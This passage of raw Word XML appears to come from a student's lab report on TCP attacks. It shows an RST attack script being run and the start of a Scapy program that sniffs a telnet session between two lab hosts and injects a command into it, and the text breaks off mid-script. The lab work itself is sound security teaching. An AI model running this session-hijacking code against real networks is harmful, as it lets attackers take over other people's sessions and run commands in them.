          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Then run the script: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python3 rst_attack.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55AF99AF" w14:textId="4A238123" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F1DF10F" wp14:editId="53636302">
            <wp:extent cx="5486400" cy="1297305"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19373152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15271" name="Picture 1" descr="A screenshot of a computer&#10;&#10;AI-generated content may be incorrect."/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="1297305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="037FA82C" w14:textId="028BF0D7" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="004006EE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Fig:17 Reset packets send to both host and close the connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B09222" w14:textId="337AEA4E" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="004006EE" w:rsidP="004006EE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Create a file named as your student no. with content “this is my name: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“full name”</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (format doesn’t matter). Write a Python program with Scapy to hijack the telnet session between Host A and Host </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>B and</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> show the above file content in Attacker’s machine (shell).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7575CE45" w14:textId="698F2BF8" w:rsidR="004006EE" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">First we need to create a text file on the attacker machine like this: </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>echo "this is my name: Le Phuc Thinh" &gt; s3893964.txt</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074E617F" w14:textId="10081CF2" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Then create a file name </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hijack_telnet.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: nano </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hijack_telnet.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B66F38" w14:textId="2C1F2597" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Paste in the code: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49976AA9" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>scapy.all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E3AF02" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49BDC2DB" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Adjust these for your setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE93151" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>IFACE = "br-88cd79cb4c2d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0015972B" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VICTIM_A = "10.9.0.5"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5754FC93" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VICTIM_B = "10.9.0.6"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726A76D5" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="795DB246" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print("</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>🔍</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sniffing one Telnet packet from A to B...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8D3306" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pkt = sniff(filter=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f"tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> host {VICTIM_A} and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> host {VICTIM_B} and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dst</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> port 23", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>iface</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=IFACE, count=1)[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EB2FF1" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A9B0453" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sport = pkt[TCP].sport</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48019A7A" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = pkt[TCP].</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="00900840" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seq = pkt[TCP].ack    # the injected packet must start at next expected seq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30992F21" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ack = pkt[TCP].seq + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(pkt[TCP].payload)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB1E173" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6622E3A9" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>print(f"</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Got packet {VICTIM_A}:{sport} &gt; {VICTIM_B}:{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dport</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>} | SEQ={seq}, ACK={ack}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6384BBC2" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7623FADB" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t># Payload to inject (telnet command)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5BADA6" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>payload = "cat s3893964.txt\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2121B085" w14:textId="77777777" w:rsidR="003E07ED" w:rsidRPr="00C2328F" w:rsidRDefault="003E07ED" w:rsidP="003E07ED">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:rPr>
